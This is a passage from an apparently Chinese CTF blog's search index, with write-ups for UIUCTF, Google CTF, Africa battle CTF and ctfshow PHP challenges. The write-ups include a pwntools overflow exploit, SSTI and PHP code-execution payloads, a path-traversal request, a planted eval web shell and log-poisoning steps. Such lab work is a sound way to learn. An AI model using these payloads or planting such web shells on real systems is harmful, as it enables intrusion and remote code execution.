# _\n cnoremap $ _\n cnoremap % _\n cnoremap ^ _\n cnoremap & _\n cnoremap * _\n cnoremap - _\n cnoremap + _\n cnoremap = _\n cnoremap ` _\n cnoremap ~ _\n cnoremap { _\n cnoremap } _\n cnoremap [ _\n cnoremap ] _\n cnoremap \\| _\n cnoremap \\ _\n cnoremap ; _\n cnoremap < _\n cnoremap > _\n cnoremap , _\n cnoremap . _\n cnoremap / _\n cnoremap ? _\n ~~~\n\n将所有字符都转换成了下划线，绕过方式还是两次`ctrl+\\`+`ctrl+n`，entry.sh中最后有一个`cat /flag`,这意味着退出vim后会打印出flag.\n\n`:q`即可。\n\n## Corny Kernel            \n\n附件给了一个c文件\n\n~~~c\n// SPDX-License-Identifier: GPL-2.0-only\n\n#define pr_fmt(fmt) KBUILD_MODNAME \": \" fmt\n\n#include <linux/module.h>\n#include <linux/init.h>\n#include <linux/kernel.h>\n\nextern const char *flag1, *flag2;\n\nstatic int __init pwny_init(void)\n{\n\tpr_alert(\"%s\\n\", flag1);\n\treturn 0;\n}\n\nstatic void __exit pwny_exit(void)\n{\n\tpr_info(\"%s\\n\", flag2);\n}\n\nmodule_init(pwny_init);\nmodule_exit(pwny_exit);\n\nMODULE_AUTHOR(\"Nitya\");\nMODULE_DESCRIPTION(\"UIUCTF23\");\nMODULE_LICENSE(\"GPL\");\nMODULE_VERSION(\"0.1\");\n~~~\n\n下面的代码的意思是当加载模块的时候输出第一段flag\n\n~~~c\nstatic int __init pwny_init(void)\n{\n\tpr_alert(\"%s\\n\", flag1);\n\treturn 0;\n}\n\n...\n\nmodule_init(pwny_init); #这行代码将 pwny_init 函数注册为模块的初始化函数。在模块加载时，该函数将被调用。\n~~~\n\n首先用`gzip -d pwnymodule.ko.gz`，然后用`insmod pwnymodule.ko`加载这个模块，加载完成后会输出第一串flag。\n\n~~~c\nstatic void __exit pwny_exit(void)\n{\n\tpr_info(\"%s\\n\", flag2);\n}\nmodule_exit(pwny_exit);   #这行代码将 pwny_exit 函数注册为模块的退出函数。在模块被卸载时，该函数将被调用来执行清理操作。\n\n~~~\n\n这一串代码的意思是这个模块在被卸载的时候输出第二段flag,用`rmmod pwnymodule.ko`这个卸载模块,然后用`dmesg`输出内核的信息，在最后会输出两段flag。\n\n## vimjail1.5\n\n~~~sh\n#entry.sh\n#!/usr/bin/env sh\n\nvim -R -M -Z -u /home/user/vimrc\n\n~~~\n\n~~~\n#vimrc\nset nocompatible\nset insertmode\n\ninoremap <c-o> nope\ninoremap <c-l> nope\ninoremap <c-z> nope\ninoremap <c-\\> nope\n~~~\n\n别的没变，但是之前的方法没用了，用`ctrl+r`这个用于执行撤销和重做操作。然后用`=execute(readfile('flag.txt'))`\n\n`=` 是用于执行表达式的命令。`execute()`：`execute()` 函数用于执行 Vim 命令。`readfile('flag.txt')`：使用 Vim 的内置函数 `readfile()` 读取名为 `flag.txt` 的文件内容，并返回一个包含文件内容的列表。就是将flag.txt里面的内容变成命令执行,然后就会报错\n\n![](/pic/uiu/vim1.5.png)\n\n或者，用`=execute(':e flag.txt')`然后按两次回车。\n\n## vimjail2.5\n\n~~~\n#vimrc\nset nocompatible\nset insertmode\n\ninoremap <c-o> nope\ninoremap <c-l> nope\ninoremap <c-z> nope\ninoremap <c-\\> nope\n\ncnoremap a _\ncnoremap b _\ncnoremap c _\ncnoremap d _\ncnoremap e _\ncnoremap f _\ncnoremap g _\ncnoremap h _\ncnoremap i _\ncnoremap j _\ncnoremap k _\ncnoremap l _\ncnoremap m _\ncnoremap n _\ncnoremap o _\ncnoremap p _\ncnoremap r _\ncnoremap s _\ncnoremap t _\ncnoremap u _\ncnoremap v _\ncnoremap w _\ncnoremap x _\ncnoremap y _\ncnoremap z _\ncnoremap ! _\ncnoremap @ _\ncnoremap # _\ncnoremap $ _\ncnoremap % _\ncnoremap ^ _\ncnoremap & _\ncnoremap * _\ncnoremap - _\ncnoremap + _\ncnoremap = _\ncnoremap ` _\ncnoremap ~ _\ncnoremap { _\ncnoremap } _\ncnoremap [ _\ncnoremap ] _\ncnoremap \\| _\ncnoremap \\ _\ncnoremap ; _\ncnoremap < _\ncnoremap > _\ncnoremap , _\ncnoremap . _\ncnoremap / _\ncnoremap ? _\n\n~~~\n\n这个只能输入`:q`，方法基本上差不多，还是`ctrl+r`然后`=`,按`TAB`键可以补全内置代码，然后找到`execute`，最后的命令是`execute(\":q\")`，后会输出flag。\n\n# crypto\n\n## Three-Time Pad                      \n\nhttp://dann.com.br/alexctf2k17-crypto100-many_time_secrets/\n\n看这篇博客，用他的脚本可以解出这道题\n\n~~~python\n#!/usr/bin/python\n## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017\n# @author intrd - http://dann.com.br/ \n# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)\n\nimport string\nimport collections\nimport sets, sys\n\n# 11 unknown ciphertexts (in hex format), all encrpyted with the same key\nc1 = \"14f5f95b4a252948a8aef177d6c92d82e3016362bd7463f41f40a00ad9e0ccad911b959ef8dfad5f1cc4481ecb64\"\nc2 = \"06e2f65a4c256d0ba8ada164cecd329cae436069f83476e91757e91bd4a4cce2c60a8f9aac8cb14210d55253cd787c0f6a\"\nc3 = \"03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386\"\nciphers = [c1, c2, c3]\n# The target ciphertext we want to crack\ntarget_cipher = \"03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386\"\n\n# XORs two string\ndef strxor(a, b):     # xor two strings (trims the longer input)\n    return \"\".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])\n\n# To store the final key\nfinal_key = [None]*150\n# To store the positions we know are broken\nknown_key_positions = set()\n\n# For each ciphertext\nfor current_index, ciphertext in enumerate(ciphers):\n\tcounter = collections.Counter()\n\t# for each other ciphertext\n\tfor index, ciphertext2 in enumerate(ciphers):\n\t\tif current_index != index: # don't xor a ciphertext with itself\n\t\t\tfor indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts\n\t\t\t\t# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)\n\t\t\t\tif char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index\n\tknownSpaceIndexes = []\n\n\t# Loop through all positions where a space character was possible in the current_index cipher\n\tfor ind, val in counter.items():\n\t\t# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!\n\t\tif val >= 7: knownSpaceIndexes.append(ind)\n\t#print knownSpaceIndexes # Shows all the positions where we now know the key!\n\n\t# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!\n\txor_with_spaces = strxor(ciphertext.decode('hex'),' '*150)\n\tfor index in knownSpaceIndexes:\n\t\t# Store the key's value at the correct position\n\t\tfinal_key[index] = xor_with_spaces[index].encode('hex')\n\t\t# Record that we known the key at this position\n\t\tknown_key_positions.add(index)\n\n# Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)\nfinal_key_hex = ''.join([val if val is not None else '00' for val in final_key])\n# Xor the currently known key with the target cipher\noutput = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex'))\n\nprint \"Fix this sentence:\"\nprint ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+\"\\n\"\n\n# WAIT.. MANUAL STEP HERE \n# This output are printing a * if that character is not known yet\n# fix the missing characters like this: \"Let*M**k*ow if *o{*a\" = \"cure, Let Me know if you a\"\n# if is too hard, change the target_cipher to another one and try again\n# and we have our key to fix the entire text!\n\n#sys.exit(0) #comment and continue if u got a good key\n\ntarget_plaintext = \"printed on flammable material so that spies could\"\nprint \"Fixed:\"\nprint target_plaintext+\"\\n\"\n\nkey = strxor(target_cipher.decode('hex'),target_plaintext)\n\nprint \"Decrypted msg:\"\nfor cipher in ciphers:\n\tprint strxor(cipher.decode('hex'),key)\n\nprint \"\\nPrivate key recovered: \"+key+\"\\n\"\n~~~\n\n运行得到flag\n\n## At Home\n\n~~~python\n#chal.py\nfrom Crypto.Util.number import getRandomNBitInteger\n\nflag = int.from_bytes(b\"uiuctf{******************}\", \"big\")\n\na = getRandomNBitInteger(256)\nb = getRandomNBitInteger(256)\na_ = getRandomNBitInteger(256)\nb_ = getRandomNBitInteger(256)\n\nM = a * b - 1\ne = a_ * M + a\nd = b_ * M + b\n\nn = (e * d - 1) // M\n\nc = (flag * e) % n\n\nprint(f\"{e = }\")\nprint(f\"{n = }\")\nprint(f\"{c = }\")\n\n~~~\n\n~~~\ne = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713\nn = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689\nc = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869\n~~~\n\n通过c=(flag*e)%n可得\n\n```\nc = (flag * e) % n\nc * e^-1 = (flag * e * e^-1) % n\nc * e^-1 = flag % n\n```\n\n~~~python\nfrom Crypto.Util.number import *\ne = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713\nn = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689\nc = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869\nd=inverse(e,n)\nflag=(c*d)%n\nprint(long_to_bytes(flag))\n~~~\n\n# PWN\n\n## Chainmail            \n\n一个基础的栈溢出，跳到give_flag的函数即可，但要注意的是在发送give_flag的地址之前要再给他发送一个`ret`的地址，否则会造成错误的对齐。`ret`的地址可以用`ROPgadget `找，命令:`ROPgadget --binary chal --only  'ret'`。\n\nexp：\n\n~~~python\nfrom pwn import *\na = remote(\"chainmail.chal.uiuc.tf\", 1337)\npayload=b'a'*72 +p64(0x40101a) + p64(0x401216)\na.sendline(payload)\na.interactive()\n~~~\n\n# WEB\n\n## peanut-xss\n\nXSS学的不是很好，具体怎么解可以看下面的文章:\n\nhttps://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss\n","tags":["ctf"],"categories":["ctf"]},{"title":"Google-CTF2023","url":"/2023/06/29/Google-CTF2023/","content":"\n# MISC\n\n## PAPAPAPA\n\n下载下来附件是一张全白的图片，通过修改jpg的宽高获得flag\n\n![](/pic/googlectf/papapa.png)\n\n从`FF`到`01`中间，修改成`FF C0 00 11 08 02 00 02 10 03 01 31 00 02 31 01 03 31 01`\n\n右边就是flag\n\n# WEB\n\n## UNDER-CONSTRUCTION\n\n给了一个flask和一个php的服务，没有办法ssti注入\n\n~~~php\nfunction getResponse()\n{\n    if (!isset($_POST['username']) || !isset($_POST['password'])) {\n        return NULL;\n    }\n\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n\n    if (!is_string($username) || !is_string($password)) {\n        return \"Please provide username and password as string\";\n    }\n\n    $tier = getUserTier($username, $password);\n\n    if ($tier === NULL) {\n        return \"Invalid credentials\";\n    }\n\n    $response = \"Login successful. Welcome \" . htmlspecialchars($username) . \".\";\n\n    if ($tier === \"gold\") {\n        $response .= \" \" . getenv(\"FLAG\");\n    }\n\n    return $response;\n}\n~~~\n\n通过代码分析，在php的服务上，只要让`tier=gold`就输出flag。\n\n可以在注册账号的时候传两个tier。\n\nflask识别第一个tier，php识别第二个tier，注册完后在php服务登录得到falg。\n\n\n\n\n\n其他的太难了，看都看不懂\n\nhttp://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/\n\n可以看这个\n","tags":["ctf"],"categories":["ctf","复盘"]},{"title":"Africa battle CTF","url":"/2023/06/26/Africa-battle-CTF/","content":"\n# WEB\n\n## Civilization\n\n```php\n<?php\nrequire(\"./flag.php\");\nif(isset($_GET['source'])){\n    highlight_file(__FILE__);  \n}\nif(isset($_GET['ami'])){\n    $input = $_GET['ami'];\n    $cigar = 'africacradlecivilization';\n    if (preg_replace(\"/$cigar/\",'',$input) === $cigar) {\n        africa();\n    }\n}\ninclude(\"home.html\");\n?> \n```\n\n?source得到这个，这个只用双写就可以绕过。\n\npayload:\n\n~~~\n?ami=africacradlecafricacradlecivilizationivilization\n~~~\n\n## Cobalt Injection \t\t\t\t\t\n\n在源代码里有\n\n`<!-- IP?capital=Benin -->`\n\n![](/pic/Africa/8085.png)\n\n可知存在ssti模板注入。没有过滤。\n\npayload:\n\n~~~\n?capital={{%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat flag.txt').read()}}\n~~~\n\n当然看别人的WP，要长脑子了\n\n~~~\n?capital={{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}\n~~~\n\n#request.application：表示当前请求的应用程序对象。\n\n~~~\n?capital={{().__class__.__base__.__subclasses__()[354]('cat flag.txt', shell=True, stdout=-1).communicate()[0].strip()}}\n~~~\n\n这个还没搞明白，搞明白了再回来修改。\n\n## Fâ\n\n访问?source\n\n~~~php\n<?php\n    include(\"flag.php\");\n\n    if(isset($_GET['source'])){\n        highlight_file(__FILE__);\n    }\n    \n    class africa {\n        var $boknn;\n        var $du;\n    }\n   \n    if (isset($_GET['fa'])) {\n        $vodoo = $_GET['fa'];\n       \n        $fa = unserialize($vodoo);\n       \n        if ($fa) {\n            $fa->du=$flag;\n            if ($fa->du === $fa->boknn)\n                echo \"Congratulation! You've got the best interpretation: <b>\".$fa->du.\"</b>\";\n            else\n                echo \"Oh no...\";\n        }\n        else echo \"you dey smoke igbo?\";\n    }\n    include(\"home.html\");\n\n?> \n~~~\n\n反序列化，只要将传入的fa值和$du相等就可以输出flag。\n\npayload:\n\n~~~\n?fa=O:6:\"africa\":2:{s:5:\"boknn\";N;s:2:\"du\";R:2;}\n~~~\n\n其中，boknn的值为NULL，du的值通过R引用了编号为2的值，\n\n![](/pic/Africa/8084.png)\n\nboknn的编号就为2。\n\n具体的可以看:https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html\n\n## Own reality \t\t\t\t\t\n\n真是让我长见识了。\n\n首先是.git泄露\n\n用wget将网站下载下来\n\n `wget http://chall.battlectf.online:8082/.git/ -mirror\n\n使用 `--mirror` 选项你可以下载整个站点，包括它的目录结构。\n\n然后用git reflog查看历史版本，之后用git cherry-pick '你想要恢复的'\n\n会出来一个flag.txt,尾部有\n\n~~~\n.__..._..__...._.___._...___._...__.__...__.._._._....__._._._..._...__..____.__._._._._.__.___..__._.__.__.___..__.____.___.___.__.___.._._____.__..._..__._.._.___._...___..__._._____..__..__..___.....__._...__.._._.__.._._.__...._..__._....___.._.__..._...__._....__..._..__.___.__.._._.__.._._..__.._..__..__..__..__...__._._.__...._..__..._..__..__.__..__..__..._..__.._...__...__.__...__.__...._..__.__..__..__...__..__..__.._...__.___._____._\n~~~\n\n二进制转换为字符就是flag\n\n## It shock you \t\t\t\t\t\n\n先用whatweb看网站，\n\n![](/pic/Africa\\8083.1.png)\n\n可以看到apache的版本，去网上找相对应的漏洞能找到，目录穿越\n\nPOC:\n\n~~~\n\nGET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt HTTP/1.1\nHost: chall.battlectf.online:8083\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nCookie: PHPSESSID=6ae53a7d294917d5fdac2db41c97b477\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Tue, 06 Jun 2023 14:53:49 GMT\nIf-None-Match: \"b6d-5fd772fd55940\"\n\n~~~\n\n## Africa\n\n`Warning: This site is only for africa people.`\n\n在bp中将`User-Agent`改为`africa`\n\n`     Warning: Go away! Attacker! This page is only for local client!`\n\n用`X-Forwarded-For`伪造127.0.0.1\n\n`Warning: I don't trust users who are not from battlectf.online`\n\n用`Referer`绕过得到flag。\n\n# Crypto\n\n## Back To Origin\n\n埃及象形文\n\nhttps://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf\n\n可以参考上面的链接\n\n## Blind\n\nhttps://gchq.github.io/CyberChef/\n\n首先是`magic`解码，然后 `braille`,解码得到flag\n\n## ROCYOU\n\n`factordb`和`yafu`分解不出来，看别人的博客知道有`ROCA漏洞`，可以从公钥中提取私钥\n\n工具：\n\nhttps://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca\n\n一开始运行要给权限\n\n![](/pic/Africa/rock.png)\n\n可以用在线的rsa解密工具：https://www.dcode.fr/chiffre-rsa\n\n~~~\np=127801155916875524149457561567678575565270601000365665873572024750823913157383\nq=113917064871970833547038329106470040388258358281464605006613652518914797349747\n~~~\n\n## goose\n\n首先给了5个随机数，然后将falg的每个字符通过`res = (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)`进行加密。\n\nflag的前几个字符是知道的，可以列方程组计算一下a,b,c,d,e的值\n\n~~~\n184473632*a+941192*b+9604*c+98*d+1*e=1245115057305148164\n177058562*a+912673*b+9409*c+97*d+1*e=1195140205147730541\n362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988\n362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988\n272097792*a+1259712*b+11664*c+108*d+1*e=1835524676869638124\n208120802*a+1030301*b+10201*c+101*d+1*e=1404473868033353193\n~~~\n\n解得：\n\n~~~\na=6709636436\nb=7748795321\nc=7386429784\nd=62359624\ne=5008041292\n~~~\n\n然后写代码爆破:\n\n~~~python\nflag = ''\na=6709636436\nb=7748795321\nc=7386429784\nd=62359624\ne=5008041292\ntab=[1245115057305148164, 1195140205147730541, 2441940832124642988, 2441940832124642988, 1835524676869638124, 1404473868033353193, 272777109172255911, 672752034376118188, 324890781330979572, 3086023531811583439, 475309634185807521, 1195140205147730541, 2441940832124642988, 1578661367846445708, 2358921859155462327, 1099718459319293547, 773945458916291731, 78288818574073053, 2441940832124642988, 1578661367846445708, 1099718459319293547, 343816904985468003, 1195140205147730541, 2527132076695959961, 2358921859155462327, 2358921859155462327, 1099718459319293547, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 3291439457645322417]\n\ndef encrypt(x):\n    return (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)\nfor val in tab:\n    for i in range(32,126):\n        if(encrypt(chr(i))==val):\n            flag+=chr(i)\n            print(flag)\n\n~~~\n\n\n\n# RE\n\n## seyi\n\nida64位打开,flag在getshell里面。\n\n## welcome\n\n![](/pic/Africa/welcome.png)\n\n重点就是这个，\n\nadd就是加，\n\nxor就是异或。\n\n很简单的一个表达式。\n\n~~~python\nfrom Crypto.Util.number import *\na = 0x522D1B20F6\nb = 0x1EE2EEEE\nc = a+b\nd = 0x0AA84AAA\nflag = c^d\nflag = long_to_bytes(flag)\nprint(flag)\n~~~\n\n## Infinity\n\n![](/pic/Africa/in.png)\n\n找到汇编代码里所有的push，然后将值转换一下\n\n~~~python\nfrom pwn import *\na=\t[p64(0x5F4F7572),\n\tp64(0x6C654354),\n\tp64(0x467B4265),\n\tp64(0x796F6E64),\n\tp64(0x62617474),\n\tp64(0x47616C61),\n\tp64(0x7869657D)]\nfor c in a:\n\tprint(c)\n\n~~~\n\n~~~\nb'ruO_\\x00\\x00\\x00\\x00'\nb'TCel\\x00\\x00\\x00\\x00'\nb'eB{F\\x00\\x00\\x00\\x00'\nb'dnoy\\x00\\x00\\x00\\x00'\nb'ttab\\x00\\x00\\x00\\x00'\nb'alaG\\x00\\x00\\x00\\x00'\nb'}eix\\x00\\x00\\x00\\x00'\n~~~\n\n然后将这些反转一下删掉多余的东西\n\n~~~\n_Our\nleCT\nF{Be\nbatt\nGala\nxie}\nyond\n~~~\n\n最后将这些拼接一下，`battleCTF{Beyond_OurGalaxie} `。\n\n## babyrev\n\n用ida打开，查询字符串能发现`qpiiatRIU{Pvqp_Ugt3_UDDS_Stn_d0D!_85864r1277qu8195pqqtp6540494pr46}`，然后凯撒解密得到flag\n\n## checker\n\n和上一题基本上差不多\n\n`gfyyqjHYK{Flg4_d0z_i3d_xr0p3_1lg0?}`然后凯撒解密\n\n","tags":["ctf"],"categories":["ctf","复盘"]},{"title":"ctfshow web入门126~150","url":"/2023/03/18/ctfshow-web入门126/","content":"# web126\n与web125差不多\n~~~\nget: a=1+fl0g=flag_give_me\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\n~~~\n# web127\n绕过方式和web123一样。\npayload：\n~~~\n?ctf show=ilove36d\n~~~\n# web128\n![](/pic/128.png)\n考察点：gettext拓展的使用\n在开启该拓展后 _() 等效于 gettext()\npayload:\n~~~\n?f1=_&f2=get_defined_vars\n~~~\n# web129\n![](/pic/129.png)\n~~~\nstripos(string,find,start)\n返回值：返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE。注释：字符串位置从0开始，不是从1开始\n~~~\n看别人的wp绕过的姿势有很多啊，但是怎么一到我这里就失灵了啊。只能用php伪协议\npayload:\n~~~\n?f=php://filter/|ctfshow/resource=flag.php   #也可以用其他的过滤器\n~~~\n# web130\n![](/pic/130.png)\n[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)\n~~~\nimport requests\n\nurl='#url'\ndata={\n    'f':'a'*1000000+'ctfshow'\n}\nr=requests.post(url=url,data=data).text\nprint(r)\n~~~\n或者\n数组绕过\n~~~\nf[]=1   #stripos应用于数组的时候会返回null，null!==false\n~~~\n或者\n~~~\nf=ctfshow\n~~~\n/s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f=ctfshow就可以了。\n# web131\n~~~\nimport requests\n\nurl='#url'\ndata={\n    'f':'a'*1000000+'36Dctfshow'\n}\nr=requests.post(url=url,data=data).text\nprint(r)\n~~~\n# web132\n![](/pic/132.png)\n一打开网站我都惊呆了，好高级的感觉。然后访问robots.txt有/admin访问就能看到源码。\n![](/pic/132.1.png)\n啊~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n这一题好简单啊。\n~~~\n$code === mt_rand(1,0x36D) && $password === $flag\n~~~\n只要让这个为false，username=admin和code=admin就行\npayload：\n~~~\n?username=admin&code=admin&password=1\n~~~\n# web134\n![](/pic/134.png)\nparse_str()函数\n~~~\n把查询字符解析到变量\n~~~\nectract()函数\n~~~\n从数组中将变量导入当前的符号表\n~~~\n~~~\nphp变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。\n~~~\n~~~\n四个变量的介绍：\n\n1.$_SERVER[\"QUERY_STRING\"]\n\n说明：查询(query)的字符串\n\n2.$_SERVER[\"REQUEST_URI\"]\n\n说明：访问此页面所需的URI\n　　\n3.$_SERVER[\"SCRIPT_NAME\"]\n\n说明：包含当前脚本的路径\n　　\n4.$_SERVER[\"PHP_SELF\"]\n~~~\n例如\n~~~\nhttp://www.xxx.com/?p=222 (附带查询)\n结果：\n$_SERVER[\"QUERY_STRING\"]==>“p=222”;\n\n$_SERVER[\"REQUEST_URI\"] ==>\"/?p=222\";\n\n$_SERVER[\"SCRIPT_NAME\"] ==>\"/index.php\";\n\n$_SERVER[\"PHP_SELF\"] ==>\"/index.php\";\n~~~\npayload:\n~~~\n?_POST[key1]=36d&_POST[key2]=36d\n~~~\n# web136\n![](/pic/136.png)\n跟着大佬学到了好多啊\n在linux里可以用tee命令读取标准输入的数据，并将其内容输出成文件\npayload:\n~~~\n?c=ls /|tee 1 #把根目录里的内容写进1文件里\n?c=tac /f149_15_h3r3|tee 2\n~~~\n# web137\n![](/pic/137.png)\n~~~\ncall_user_func — 把第一个参数作为回调函数调用\n~~~\n考察调用类中的函数\n~~~\nphp中 ->与:: 调用类中的成员的区别\n->用于动态语境处理某个类的某个实例\n::可以调用一个静态的、不依赖于其他初始化的类方法.\n~~~\npayload:\n~~~\nPOST:ctfshow=ctfshow::getFlag\n~~~\n# web138\n![](/pic/138.png)\n相当于把冒号禁用了，但是call_user_func还可以传数组\n第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。\npayload:\n~~~\nPOST:ctfshow[0]=ctfshow&ctfshow[1]=getFlag\n~~~\n# web139\n太难了，脚本看不懂，以后有机会了再做\n# web140\n![](/pic/140.png)\n可以看到只要我们让intval($code)为0就可以了\nintval会将非数字字符转换为0，也就是说 intval('a')==0 intval('.')==0 intval('/')==0\n所以方法就挺多了\n![](/pic/140.1.png)\npayload：\n~~~\nf1=chr&f2=chr\n~~~\n我感觉随便搞一点函数放上去都可以。\n# web141\n![](/pic/141.png)\n传入的v3必须是非单词字符\n[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）](https://blog.csdn.net/miuzzx/article/details/109143413)\npayload：\n~~~\n?v1=1&v2=1&v3=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)-\n~~~\n# web142\n![](/pic/142.png)\nemmmmmmmmmmmm，让我太奶来都会做\npayload:\n~~~\n?v1=0\n~~~\n# web143\n![](/pic/143.png)\n~~~\n?v1=1&v3=*(\"%0c%06%0c%0b%05%0d\"^\"%7f%7f%7f%7f%60%60\")(\"%0b%01%03%00%06%00\"^\"%7f%60%60%20%60%2a\")*&v2=1\n~~~\n# web144\n![](/pic/144.png)\n对v3的长度进行了限制,所以在v2上下手\npayload:\n~~~\n?v1=1&v2=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)&v3=1\n~~~\n# web145\n![](/pic/145.png)\n可以用三目运算符\n~~~\neval(\"return 1?phpinfo():1;\"); #这是可以运行的\n~~~\npayload:\n~~~\n?v1=1&v2=1&v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):\n~~~\n# web146\n过滤了：没办法用三目运算符，可以用等号和位运算符\\\n~~~\neval(\"return 1==phpinfo()||1;\");  #这也可以运行\n~~~\npayload:\n~~~\n?v1=1&v2=1&v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)||\n~~~\n# web147\n![](/pic/147.png)\n[具体原理看这个](https://paper.seebug.org/755/)\n~~~\ncreate_function('$a','echo $a.\"123\"')\n\n类似于\n\nfunction f($a) {\n  echo $a.\"123\";\n}\n~~~\npayload:\n~~~\nGET:?show=}system(\"tac flag.php\");/*\nPOST:ctf=\\create_function\n~~~\n# web148\n![](/pic/148.png)\n没过滤异或还可以用异或\npayload:\n~~~\n?code=(\"%08%02%08%09%05%0d\"^\"%7b%7b%7b%7d%60%60\")(\"%09%01%03%01%06%0c%01%07%01%0b%08%0b\"^\"%7d%60%60%21%60%60%60%60%2f%7b%60%7b\");\n~~~\n# web149\n![](/pic/149.png)\n预期解是条件竞争，可是我搞了半天也不行，就直接在index.php里改了\npayload:\n~~~\nGET: ?ctf=index.php\nPOST: show=<?php @eval($_POST[a];)?>\n~~~\n然后用蚁剑连接。\n# web150\n~~~\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#过滤字符\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE){\n    include($ctf);\n} \n~~~\n非预期\n日志文件包含写一句话\n修改user_agent内容为一句话，然后包含/var/log/nginx/access.log就可以使用我们写的一句话了。\n首先访问index.php 修改user_agent为<?php eval($_POST['a']);?>\n![](/pic/150.png)\n\n","tags":["ctfshow","刷题","php特性"],"categories":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门110~125","url":"/2023/03/17/ctfshow-web入门110/","content":"# 